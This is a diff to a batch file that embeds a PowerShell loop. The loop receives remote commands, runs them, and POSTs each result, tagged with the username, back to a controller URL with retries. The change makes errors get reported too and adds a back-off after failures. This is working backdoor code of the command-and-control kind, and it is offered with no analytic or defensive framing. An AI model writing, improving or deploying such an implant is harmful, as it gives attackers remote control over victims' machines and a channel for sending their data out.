@@ -29,29 +29,34 @@ powershell -NoProfile -Command ^
     "                if ([string]::IsNullOrWhiteSpace($output)) {" ^
     "                    $output = \"'$receivedCommand' executed\";" ^
     "                }" ^
-    "                $finalOutput = \"$username$separator$output\";" ^
-    "                Write-Host \"Sending response: $finalOutput\";" ^
-    "                $headers = @{'Content-Type' = 'text/plain'};" ^
-    "                $postSuccess = $false;" ^
-    "                $postAttempts = 0;" ^
-    "                while (-not $postSuccess -and $postAttempts -lt 3) {" ^
-    "                    try {" ^
-    "                        Invoke-WebRequest -Uri $url -Method Post -Body $finalOutput -Headers $headers -TimeoutSec 20;" ^
-    "                        $postSuccess = $true;" ^
-    "                    } catch {" ^
-    "                        Write-Host \"Error sending POST request: $($_.Exception.Message)\";" ^
-    "                        Start-Sleep -Seconds 5;" ^
-    "                        $postAttempts++;" ^
-    "                    }" ^
-    "                }" ^
-    "                if (-not $postSuccess) { Write-Host 'Failed to send output after 3 attempts. Continuing...'; }" ^
-    "                $lastCommand = $receivedCommand;" ^
     "            } catch {" ^
-    "                Write-Host \"Error executing command: $($_.Exception.Message)\";" ^
+    "                $output = \"Error executing command: $($_.Exception.Message)\";" ^
+    "                Write-Host $output;" ^
     "            }" ^
     "        } catch {" ^
-    "            Write-Host \"Unexpected error: $($_.Exception.Message)\";" ^
+    "            $output = \"Unexpected error: $($_.Exception.Message)\";" ^
+    "            Write-Host $output;" ^
     "        }" ^
+    "        $finalOutput = \"$username$separator$output\";" ^
+    "        Write-Host \"Sending response: $finalOutput\";" ^
+    "        $headers = @{'Content-Type' = 'text/plain'};" ^
+    "        $postSuccess = $false;" ^
+    "        $postAttempts = 0;" ^
+    "        while (-not $postSuccess -and $postAttempts -lt 3) {" ^
+    "            try {" ^
+    "                Invoke-WebRequest -Uri $url -Method Post -Body $finalOutput -Headers $headers -TimeoutSec 20;" ^
+    "                $postSuccess = $true;" ^
+    "            } catch {" ^
+    "                Write-Host \"Error sending POST request: $($_.Exception.Message)\";" ^
+    "                Start-Sleep -Seconds 5;" ^
+    "                $postAttempts++;" ^
+    "            }" ^
+    "        }" ^
+    "        if (-not $postSuccess) { Write-Host 'Failed to send output after 3 attempts. Continuing...'; }" ^
+    "        if ($output -like 'Error*') {" ^
+    "            Start-Sleep -Seconds 10;" ^
+    "        }" ^
+    "        $lastCommand = $receivedCommand;" ^
     "    }" ^
     "}" ^
 echo Looping again...
